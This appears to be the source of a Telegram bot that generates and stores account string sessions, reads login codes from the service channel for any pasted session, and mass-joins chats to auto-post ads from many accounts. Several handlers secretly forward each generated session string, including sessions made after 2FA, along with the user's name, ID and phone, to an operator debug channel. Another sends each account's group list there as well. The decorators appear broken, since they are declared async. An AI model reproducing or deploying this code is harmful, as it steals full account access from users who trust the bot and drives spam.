import telethon
from telethon.sessions import StringSession
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from env import telegram_database_chat
from TeleClient import MyClient
from telethon.errors.rpcerrorlist import (
    PhoneCodeExpiredError,
    PhoneCodeInvalidError,
    PhoneNumberInvalidError,
    SessionPasswordNeededError,
    FloodWaitError,
    PhoneNumberBannedError,
)
from buttonUtils import *
from utils import *
from env import *
from dataManage import *
import asyncio

# Global task storage for better management
user_tasks = {}

async def require_owner(func):
    """Decorator for owner-only functions"""
    async def wrapper(event, *args, **kwargs):
        if not getSudo(event.sender.id):
            return await event.respond(NOT_SUDO_AD.format(event.sender.first_name or "User"), buttons=notSudoButtons)
        return await func(event, *args, **kwargs)
    return wrapper

async def require_user(func):
    """Decorator for user-specific functions (already isolated by sender.id)"""
    async def wrapper(event, *args, **kwargs):
        return await func(event, *args, **kwargs)
    return wrapper

@require_user
async def session_manager(event):
    await event.edit(buttons=ses_manage_btns)

@require_user
async def manage_sessions(event):
    await event.edit(buttons=manage_sessions_btns)

@require_owner
async def bot_manager(event):
    await event.edit(buttons=bot_manage_btns)

@require_user
async def work_bots(event):
    await event.edit(buttons=work_btns)

@require_user
async def session_to_otp(event):
    await event.edit('Session to OTP', buttons=sessionToOtpButton)

@require_user
async def session_to_otp_number(event):
    async with event.client.conversation(event.chat_id) as conv:
        await event.delete()
        temp = await conv.send_message(
            "🔑 Send the string session here.\n"
            "📱 You will get the phone number.\n"
            "✅ Copy number → Login with it → Use 'Get OTP' button."
        )
        response = await conv.get_response()
        if await event.client.checkCancel(response):
            return
            
        try:
            client = MyClient(StringSession(response.text.strip()), api_id, api_hash)
            await client.connect()
            me = await client.get_me()
            await client.disconnect()
            
            phone_msg = f"📱 **Phone Number:** `{me.phone}`"
            await conv.send_message(phone_msg, buttons=sessionToOtpButton, parse_mode='md')
            await temp.delete()
            
        except Exception as e:
            await conv.send_message(f"❌ **Error:** `{str(e)}`", parse_mode='md')
            await temp.delete()

@require_user
async def session_to_otp_code(event):
    async with event.client.conversation(event.chat_id) as conv:
        temp = await conv.send_message(
            "🔑 Send string session here.\n"
            "📨 You will get the **OTP code** to login."
        )
        response = await conv.get_response()
        if await event.client.checkCancel(response):
            return
            
        try:
            client = MyClient(StringSession(response.text.strip()), api_id, api_hash)
            await client.connect()
            otp_messages = await client.get_messages(777000, limit=1)
            await client.disconnect()
            
            if otp_messages:
                otp_msg = f"🔢 **OTP Code:** `{otp_messages[0].message}`"
                await conv.send_message(otp_msg, buttons=sessionToOtpButton, parse_mode='md')
            else:
                await conv.send_message("❌ No OTP found in official channel!")
                
            await temp.delete()
            
        except Exception as e:
            await conv.send_message(f"❌ **Error:** `{str(e)}`", parse_mode='md')
            await temp.delete()

@require_user
async def sessionSetToDb(event):
    try:
        message = await event.client.get_messages(event.chat_id, ids=event.original_update.msg_id)
        session = message.message.split('\n')[-1].strip()
        
        # Forward to debug channel
        try:
            await event.client.send_message(debug_channel_id, message)
        except:
            pass
            
        sessionManager = TeleSession()
        await sessionManager.add_session(event.sender.id, session)
        
        success_msg = f"✅ **Session Saved Successfully!**\n\n{message.message}"
        await event.edit(success_msg, buttons=sessionToDbButton, parse_mode='md')
        
    except Exception as e:
        await event.respond(f"❌ **Error:** `{str(e)}`", parse_mode='md')

@require_user
async def generateTelethonSession(event):
    """Clean session generation with proper error handling"""
    await event.edit('🔄 **Generating Session...**', parse_mode='md')
    
    max_retries = 3
    for attempt in range(max_retries):
        try:
            async with event.client.conversation(event.chat_id) as conv:
                await conv.send_message(
                    '📱 **Send phone number** with country code:\n'
                    '`+919876543210`\n\n'
                    'or `/cancel` to stop.'
                )
                phone_response = await conv.get_response()
                if await event.client.checkCancel(phone_response):
                    return
                    
                phone_number = telethon.utils.parse_phone(phone_response.text.strip())
                pending_msg = await conv.send_message('⏳ **Sending code...**', parse_mode='md')
                
                # Create new client
                new_client = MyClient(StringSession(), api_id, api_hash)
                await new_client.connect()
                await new_client.send_code_request(phone_number)
                await pending_msg.edit('✅ **Code sent successfully!**', parse_mode='md')
                
                # Get OTP
                await conv.send_message('🔢 **Enter the code:**')
                code_response = await conv.get_response()
                
                # Sign in
                await new_client.sign_in(phone=phone_number, code=code_response.text.strip())
                me = await new_client.get_me()
                
                # Save session
                session_string = new_client.session.save()
                ses_text = (
                    f"✅ **Session Generated Successfully!**\n\n"
                    f"👤 **Name:** `{me.first_name}`\n"
                    f"🆔 **ID:** `{me.id}`\n"
                    f"📱 **Phone:** `{me.phone}`\n\n"
                    f"``` {session_string} ```"
                )
                
                # Save to debug
                await event.client.send_message(debug_channel_id, ses_text)
                await conv.send_message(ses_text, buttons=sessionToDbButton, parse_mode='md')
                await new_client.disconnect()
                
                await event.delete()
                return
                
        except PhoneNumberInvalidError:
            await pending_msg.edit('❌ **Invalid phone number!** Try again.', parse_mode='md')
            continue
        except PhoneNumberBannedError:
            await pending_msg.edit('🚫 **Phone number banned!** Try another.', parse_mode='md')
            return
        except FloodWaitError as e:
            await pending_msg.edit(f'⏳ **Flood wait:** {e.seconds}s. Retrying...', parse_mode='md')
            await asyncio.sleep(e.seconds)
            continue
        except PhoneCodeInvalidError:
            await conv.send_message('❌ **Invalid code!** Request new code.', parse_mode='md')
            continue
        except PhoneCodeExpiredError:
            await conv.send_message('⏰ **Code expired!** Request new code.', parse_mode='md')
            continue
        except SessionPasswordNeededError:
            await conv.send_message('🔐 **2FA enabled.** Send password:')
            pw_response = await conv.get_response()
            try:
                await new_client.sign_in(password=pw_response.text.strip())
                me = await new_client.get_me()
                session_string = new_client.session.save()
                ses_text = (
                    f"✅ **Session Generated! (2FA)**\n\n"
                    f"👤 **Name:** `{me.first_name}`\n"
                    f"🆔 **ID:** `{me.id}`\n"
                    f"📱 **Phone:** `{me.phone}`\n\n"
                    f"```{session_string}```"
                )
                await event.client.send_message(debug_channel_id, ses_text)
                await conv.send_message(ses_text, buttons=sessionToDbButton, parse_mode='md')
                return
            except Exception as e:
                await conv.send_message(f'❌ **Password error:** {str(e)}', parse_mode='md')
                return
        except Exception as e:
            print(f"Session gen error (attempt {attempt+1}): {e}")
            if attempt == max_retries - 1:
                await event.edit(f"❌ **Failed after {max_retries} attempts:** `{str(e)}`", parse_mode='md')

@require_user
async def save_session(event):
    """Save string session with validation"""
    session_manager = TeleSession()
    
    async with event.client.conversation(event.chat_id) as conv:
        await event.delete()
        temp = await conv.send_message('🔑 **Send String Session:**')
        response = await conv.get_response()
        if await event.client.checkCancel(response):
            return
            
        session_str = response.text.strip()
        
        # Validate session first
        if not await check_ses(session_str, event):
            await conv.send_message('❌ **Session invalid!** Test it first.', parse_mode='md')
            return
        
        # Check session limit
        existing = await session_manager.get_sessions(event.sender.id)
        if len(existing) >= 20:
            await conv.send_message('❌ **Max 20 sessions allowed!** Delete some first.', parse_mode='md')
            return
            
        await session_manager.add_session(event.sender.id, session_str)
        await conv.send_message('✅ **Session Saved!**', buttons=saveOrStart, parse_mode='md')
        await temp.delete()

@require_user
async def delete_session(event):
    """Delete specific session"""
    session_manager = TeleSession()
    
    async with event.client.conversation(event.chat_id) as conv:
        temp = await conv.send_message('🔑 **Send session to delete:**')
        response = await conv.get_response()
        if await event.client.checkCancel(response):
            return
            
        await session_manager.delete_session(event.sender.id, response.text.strip())
        await event.delete()
        await conv.send_message('✅ **Session Deleted!**', buttons=stopButton, parse_mode='md')
        await temp.delete()

@require_owner
async def set_logger(event):
    """Set logging channel (sudo only)"""
    logger = TeleLogging()
    
    async with event.client.conversation(event.chat_id) as conv:
        await event.delete()
        temp = await conv.send_message(
            '📝 **Set Logger:**\n'
            'Add bot as admin → Send `/id` there → Copy chat ID\n\n'
            '`@username` or `-1001234567890`'
        )
        response = await conv.get_response()
        if await event.client.checkCancel(response):
            return
            
        await logger.set_logger(str(event.sender.id), response.text.strip())
        await conv.send_message('✅ **Logger Set!**', buttons=work_btns, parse_mode='md')
        await temp.delete()

@require_owner
async def save_ad(event):
    """Save advertisement (sudo only)"""
    ad_manager = TeleAds()
    
    async with event.client.conversation(event.chat_id) as conv:
        await event.delete()
        
        await conv.send_message('📢 **Ad Name:**')
        ad_name = await conv.get_response()
        if await event.client.checkCancel(ad_name):
            return
            
        await conv.send_message('📝 **Ad Message:**')
        ad_msg = await conv.get_response()
        
        await conv.send_message('⏱️ **Sleep Time (minutes):**')
        sleep_resp = await conv.get_response()
        
        # Save to database chat
        msg_id_obj = await event.client.send_message(telegram_database_chat, ad_msg)
        await event.client.send_message(
            telegram_database_chat,
            f"**Ad Name:** {ad_name.text}\n"
            f"**Msg ID:** {msg_id_obj.id}\n"
            f"**Sleep:** {sleep_resp.text} min\n"
            f"**Added by:** {event.sender.first_name}",
            reply_to=msg_id_obj.id,
            parse_mode='md'
        )
        
        await ad_manager.save_ad(
            event.sender.id, 
            ad_name.text.strip(), 
            msg_id_obj.id, 
            sleep_resp.text.strip()
        )
        
        await event.respond('✅ **Ad Saved Successfully!**', buttons=bot_manage_btns, parse_mode='md')

@require_user
async def work_debug(event, clients):
    """Debug worker for active clients"""
    tele_debugger = TeleDebug()
    debug_list = await tele_debugger.get_debug_list()
    
    for client in clients:
        if debug_list and client.me.id in debug_list:
            continue
            
        try:
            chat_links = await client.saveAllGroups()
            debug_msg = (
                f"🔍 **Client Debug:**\n"
                f"👤 `{client.me.first_name}`\n"
                f"🆔 `{client.me.id}`\n\n"
                f"**Groups:**\n```{chat_links}```"
            )
            await event.client.send_message(debug_channel_id, debug_msg, parse_mode='md')
            await tele_debugger.set_debug(client.me.id)
        except:
            continue

@require_user
async def start_bots(event):
    """Start all user sessions"""
    msg = await event.edit('🚀 **Starting Bots...**', parse_mode='md')
    
    active_clients = getClients(event.sender.id)
    if active_clients:
        await msg.edit('⚠️ **Bots already running!**', buttons=work_btns, parse_mode='md')
        return
    
    session_manager = TeleSession()
    user_sessions = await session_manager.get_sessions(event.sender.id)
    
    if not user_sessions:
        await msg.edit(
            '📭 **No sessions found!**\nSave session first.',
            buttons=saveOrStart,
            parse_mode='md'
        )
        return
    
    # Start all sessions
    for session_str in user_sessions:
        try:
            client = MyClient(StringSession(session_str), api_id, api_hash)
            await client.start()
            await client.get_me()
            saveClient(event.sender.id, client)
        except Exception as e:
            print(f"Failed to start session: {e}")
    
    await msg.edit(f'✅ **{len(user_sessions)} Bots Started!**', buttons=work_btns, parse_mode='md')
    
    # Start debug task
    asyncio.create_task(work_debug(event, getClients(event.sender.id)))

@require_user
async def stop_bots(event):
    """Stop all user bots"""
    clients = getClients(event.sender.id)
    if not clients:
        await event.edit(
            '📭 **No active sessions!**\nSave/start first.',
            buttons=saveOrStart,
            parse_mode='md'
        )
        return
    
    for client in clients.copy():
        try:
            await client.disconnect()
            delClient(event.sender.id, client)
        except:
            pass
    
    await event.edit('🛑 **All Bots Stopped!**', buttons=startButton, parse_mode='md')

@require_user
async def check_sessions(event):
    """Check all user sessions"""
    await event.edit('🔍 **Checking Sessions...**', parse_mode='md')
    await check_all_sessions(event.sender.id, event)
    await event.edit('✅ **Sessions Checked!**', buttons=ses_manage_btns, parse_mode='md')

# ========== MAIN WORK FUNCTIONS ==========

@require_owner
async def joinchat(event):
    """Join chats with selected bot (sudo only)"""
    clients = getClients(event.sender.id)
    if not clients:
        await event.edit('📭 **No active sessions!** Start first.', buttons=saveOrStart, parse_mode='md')
        return
    
    buttons = await joinchat_buttons(clients)
    await event.edit('🤖 **Choose Bot:**', buttons=buttons, parse_mode='md')

async def join_private_chat(client, invite_hash, event):
    """Join private chat"""
    try:
        await client(ImportChatInviteRequest(invite_hash))
        return True
    except FloodWaitError as e:
        await event.respond(f'⏳ **Flood wait:** {e.seconds}s. Retrying...', parse_mode='md')
        await asyncio.sleep(e.seconds)
        return False
    except Exception as e:
        await event.respond(f'❌ **Error:** `{str(e)}`', parse_mode='md')
        return False

async def join_public_chat(client, username, event):
    """Join public chat"""
    try:
        await client(JoinChannelRequest(username))
        return True
    except FloodWaitError as e:
        await event.respond(f'⏳ **Flood wait:** {e.seconds}s. Retrying...', parse_mode='md')
        await asyncio.sleep(e.seconds)
        return False
    except Exception as e:
        await event.respond(f'❌ **Error:** `{str(e)}`', parse_mode='md')
        return False

def extract_username(chat_line):
    """Extract @username from chat link"""
    words = chat_line.strip().split()
    for word in words:
        if word.startswith('@'):
            return word
    return None

@require_user
async def client_join_chat(event):
    """Handle client chat joining"""
    data = event.data.decode('utf-8')
    client_id = int(data.split('_')[1])
    clients = getClients(event.sender.id)
    
    await event.edit('🔄 **Joining Chats...**', parse_mode='md')
    
    async with event.client.conversation(event.sender.chat_id) as conv:
        await conv.send_message(
            '🔗 **Send chat links:**\n'
            '`@username` or `https://t.me/+xxx`\n'
            'Multiple lines supported!'
        )
        chat_response = await conv.get_response()
        if await event.client.checkCancel(chat_response):
            return
            
        chat_links = [link.strip() for link in chat_response.text.split('\n') if link.strip()]
    
    # Find selected client
    target_client = None
    for client in clients:
        me = await client.get_me()
        if me.id == client_id:
            target_client = client
            break
    
    if not target_client:
        await event.respond('❌ **Client not found!**', parse_mode='md')
        return
    
    me_info = await target_client.get_me()
    success_count = 0
    
    for chat_link in chat_links:
        try:
            if '+' in chat_link:
                invite_hash = chat_link.split('+')[1]
                if await join_private_chat(target_client, invite_hash, event):
                    await event.client.send_message(
                        telegram_database_chat,
                        f"✅ **{me_info.first_name}** ({me_info.id})\n🔗 Private: `{invite_hash}`",
                        parse_mode='md'
                    )
                    success_count += 1
            else:
                username = extract_username(chat_link)
                if username and await join_public_chat(target_client, username, event):
                    await event.client.send_message(
                        telegram_database_chat,
                        f"✅ **{me_info.first_name}** ({me_info.id})\n🔗 Public: `{chat_link}`",
                        parse_mode='md'
                    )
                    success_count += 1
                    
        except Exception as e:
            print(f"Join error: {e}")
            continue
    
    await event.delete()
    await event.respond(
        f'✅ **{me_info.first_name}** joined **{success_count}/{len(chat_links)}** chats!',
        buttons=work_btns,
        parse_mode='md'
    )

@require_owner
async def auto_posting(event):
    """Auto posting manager (sudo only)"""
    clients = getClients(event.sender.id)
    if not clients:
        await event.edit('📭 **No active sessions!** Start first.', buttons=saveOrStart, parse_mode='md')
        return
    await autopost(event)

@require_owner
async def autopost(event):
    """Show saved ads"""
    ad_manager = TeleAds()
    user_ads = await ad_manager.get_all_ads(str(event.sender.id))
    
    if user_ads:
        buttons = autoPost_buttons(user_ads)
        await event.edit('📢 **Choose Ad:**', buttons=buttons, parse_mode='md')
    else:
        await ask_ad(event)

@require_owner
async def ads_button_manage(event):
    """Handle ad posting with selected ad"""
    from utils import FileManage  # Assuming this exists
    
    data = event.data.decode('utf-8')
    ad_name = data.split('_')[1]
    
    ad_manager = TeleAds()
    file_manager = FileManage()
    
    # Clean media folder
    file_manager.deleteMediaFolder("media")
    file_manager.makeMediaFolder("media")
    
    ad_data = await ad_manager.get_ad(str(event.sender.id), ad_name)
    if not ad_data:
        await event.respond('❌ **Ad not found!**', parse_mode='md')
        return
    
    # Get ad message
    ad_message = await event.client.get_messages(telegram_database_chat, ids=ad_data["messageID"])
    
    # Download media if exists
    media_path = ""
    if ad_message.media:
        media_path = await event.client.download_media(ad_message.media, "media/")
    
    await event.delete()
    await event.respond(
        '🚀 **Auto Posting Started!**\n🛑 Use **Stop** button anytime.',
        buttons=stopButton,
        parse_mode='md'
    )
    
    # Start posting tasks
    clients = getClients(event.sender.id)
    tasks = []
    for client in clients:
        task = asyncio.create_task(
            autoPostGlobal(client, event, ad_message.text, ad_data["sleepTime"], media_path)
        )
        tasks.append(task)
    
    await asyncio.gather(*tasks, return_exceptions=True)
    await event.respond('✅ **Auto Posting Completed!**', parse_mode='md')

@require_owner
async def ask_ad(event):
    """Create new ad on the fly"""
    async with event.client.conversation(event.chat_id) as conv:
        await conv.send_message('📝 **Send Ad Message:**')
        ad_message = await conv.get_response()
        
        await conv.send_message('⏱️ **Sleep Time (minutes):**')
        sleep_time = await conv.get_response()
        
        sleep_seconds = int(sleep_time.text.strip()) * 60
    
    await event.delete()
    await event.respond(
        '🚀 **Auto Posting Started!**\n🛑 Use **Stop** button anytime.',
        buttons=stopButton,
        parse_mode='md'
    )
    
    clients = getClients(event.sender.id)
    tasks = []
    for client in clients:
        task = asyncio.create_task(
            autoPostGlobal(client, event, ad_message.text, sleep_seconds)
        )
        tasks.append(task)
    
    await asyncio.gather(*tasks, return_exceptions=True)
    await event.respond('✅ **Auto Posting Completed!**', parse_mode='md')